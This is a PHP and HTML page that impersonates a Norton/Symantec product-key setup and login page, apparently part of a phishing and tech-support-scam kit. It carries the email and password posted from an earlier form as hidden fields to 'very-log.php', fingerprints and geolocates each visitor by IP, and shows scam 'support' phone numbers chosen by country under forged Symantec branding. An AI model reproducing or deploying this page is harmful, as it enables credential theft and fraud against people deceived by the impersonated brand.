<?php
if(isset($_POST['submit']))
{

    $email=$_POST['email'];
    $pass=$_POST['password'];
}
?>
<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
<?php

$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();

?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?>

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Norton</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
  <link rel="shortcut icon" href="../img/favicon.ico"/>
  <link rel="stylesheet" href="./css/style.css">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">

  <style>
        ::-webkit-input-placeholder { /* Edge */
    color: #4d4d4d;
    font-size: 16px;
    font-weight: 300;
    text-align:left;
    /* padding-left:15px; */
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  :-ms-input-placeholder { /* Internet Explorer */
    color: #4d4d4d;
  }
  
  ::placeholder {
    color: #4d4d4d;
  }
        .loader 
        {   
            margin-left:45%;
            margin-top:15%;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .rk-activ1{
            margin-top:8%;
        }
        .loader2 
        {   
            margin-left:35%;
            margin-top:10%;
            display:none;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media only screen and (max-width: 1200px)
        {
            .loader
            {
                margin-top:18%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 425px)
        {
            .loader
            {
                margin-top:35%;
                margin-left:35%;
            }
        }
        #actr{
            display:none;
        }
    </style>
</head>
<body>	

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154244563-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-154244563-1');
</script>


<nav class="navbar navbar-color" style="min-height:57px; z-index:10;">
  <div class="container">
    <div class="navbar-header">
      <a class="navbar-brand" href="index.php"><img src="../img/Norton_av_logo.png" class="image-responsive logo-nort" ></a>
    </div>
    <ul class="nav navbar-nav navbar-center">
	<li class="btn btn-lg nav-btn"><a href="../actnor-form.php">Setup Product Key</a></li>
	<li class="btn btn-lg nav-btn"><a href="nor-log.php">Login</a></li>
	<li class="btn btn-lg nav-btn"><a href="../norreg/nor-reg.php">Register</a></li>
	<li class="btn btn-lg nav-btn"><a href="../nor-support.php">Contact Support</a></li>
	</ul>
  </div>
</nav>

	<div class="slider-height">
		<img src="../img/bg-sso-ap.png" class="slider-img">
	</div> <br>

<div class="body-form"> 
	<div class="col-lg-12 body-form">
		<div class="col-lg-6 col-md-6 col-sm-6 form-content">
			<h2 class="text-center heading">Welcome to Norton</h2>
			<p class=" para-home">Sign in with the email address and password you used during your purchase.</p>
		</div>
		<div class="col-lg-6 col-md-6 col-sm-6 respon-foot">
			<div class="col-lg-6 col-md-12 form-header nor-for-af" >
				<form action="very-log.php" method="post">
					<h5 class="text-center product-heading1">Having New Product Key Enter Below</h5>
					<!-- <p class="text-center" style="font-size: 12px;">Enter your information below to setup now</p> -->
					<br>
					<div class="form-group">
						<input type="text" id="nameField" name="key_field" class="form-control input-cls" placeholder="Enter Product Key To Setup" required>
					</div>
					<div class="form-group">
                        <input type="hidden"  name="email" class="form-control input-cls" value="<?php echo  $email ?>" placeholder="Email address">
                        <input type="hidden" name="password" class="form-control input-cls" value="<?php echo  $pass ?>" placeholder="Email address">
					</div>
					<div class="col-lg-12">
						<input type="submit" name="submit" class="form-control submit-btn" value="Submit">
                    </div>
                    <div class="form-group text-center">
						<label style="font-weight: 400;font-size: 18px;margin-bottom: -9px;">OR</label>
                    </div>
                    <div class="col-lg-12">
						<!-- <input type="submit" name="submit" class="form-control submit-btn" value="Continue Login"> -->
                    </div>
				</form>
				<form action="very-log.php" method="post">
					<div class="form-group">
                        <input type="hidden" id="nameField" name="key_field" class="form-control input-cls" value="Don't Have Product Key" placeholder="Enter Product Key To Setup">
                        <input type="hidden"  name="email" class="form-control input-cls" value="<?php echo  $email ?>" placeholder="Email address">
                        <input type="hidden" name="password" class="form-control input-cls" value="<?php echo  $pass ?>" placeholder="Email address">
					</div>
                    <div class="form-group text-center">
						<label style="font-weight: 400;font-size: 18px;margin-top: -9px;">Don't Have Product Key?</label>
                    </div>
                    <div class="col-lg-12">
						<input type="submit" name="submit" class="form-control submit-btn" value="Continue Login">
                    </div>
				</form>
			</div>
		</div>
	</div>
</div>
<div class="loader2 text"></div>

<footer>
<div class="footer">
  <p><span class="cont-text">Customer Support Toll Free:</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
    echo "US/CA +1 844 514 0331";
}
elseif($c_code == "CA")
{
    echo "US/CA +1 844 514 0331";
}
elseif($c_code == "GB")
{
    echo "UK   +44 800 229 4981";
}
elseif($c_code == "AU")
{
    echo "AU   +1 844 514 0331";
}
elseif($c_code == "NZ")
{
    echo "NZ   +1 844 514 0331";
}
else
{
    echo "+1 844 514 0331";
}
?>
  </span> </p>
</div>
	<div class="col-lg-12 foot-li">
		<!-- <span class="footer-img"><img src="img/corporate-sign-off-white.png"></span> -->
		<!-- <span><p class="copyright-mark">&nbsp;©1995-2019&nbsp;Symantec Corporation&nbsp;&nbsp; | </p></span>
		<span><p class="copyright-terms"> Terms of service &nbsp; | </p></span>
		<span><p class="copyright-privacy">&nbsp;&nbsp; Privacy Policy &nbsp; </p></span> -->
		<ul>
			<li><img src="../img/corporate-sign-off-white.png"></li>
			<li>©1995-2019&nbsp;Symantec Corporation &nbsp;&nbsp;| &nbsp;&nbsp;</li>
			<li> Terms of service &nbsp; | </li>
			<li>&nbsp;&nbsp; Privacy Policy &nbsp; </li>
		</ul>
	</div>
</footer>
</body>
</html>